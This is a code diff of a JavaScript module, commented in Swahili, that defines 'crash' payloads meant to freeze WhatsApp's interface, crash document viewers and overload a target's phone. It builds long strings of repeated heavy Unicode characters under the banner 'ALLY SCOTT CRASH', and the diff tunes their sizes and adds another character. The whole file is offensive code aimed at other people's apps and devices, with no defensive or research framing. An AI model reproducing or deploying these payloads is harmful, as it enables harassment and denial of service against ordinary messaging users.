@@ -4,21 +4,22 @@
  */
 
 const payloads = {
-    // Hii ni payload nzito inayochanganya alama nyingi kulemaza WhatsApp UI
+    // Nguvu ya kutosha kulemaza WhatsApp UI kirahisi
     crashPayload: (function() {
         let str = "☣️ ALLY SCOTT CRASH ☣️\n";
-        let heavy = "҈".repeat(500) + "⡈".repeat(500) + "ᚙ".repeat(500);
-        for (let i = 0; i < 50; i++) {
+        // Kutumia mchanganyiko wa Unicode characters nzito
+        let heavy = "҈".repeat(400) + "⡈".repeat(400) + "ᚙ".repeat(400) + "𝀛".repeat(400);
+        for (let i = 0; i < 40; i++) {
             str += heavy + "\n";
         }
         return str;
     })(),
 
-    // Payload ya ziada kwa ajili ya Document crashes
-    docPayload: "📂 SYSTEM OVERLOAD 📂".repeat(10000),
+    // Payload maalum kwa ajili ya Document crashes (PDF/DOC)
+    docPayload: "📂 SYSTEM OVERLOAD 📂".repeat(5000),
 
-    // Hii inasaidia kwenye Buffer management
-    overflow: Buffer.alloc(1024 * 10, 'X').toString()
+    // Inatumika kulemaza buffer ya simu za target
+    overflow: Buffer.alloc(1024 * 5, '👾').toString()
 };
 
 module.exports = payloads;
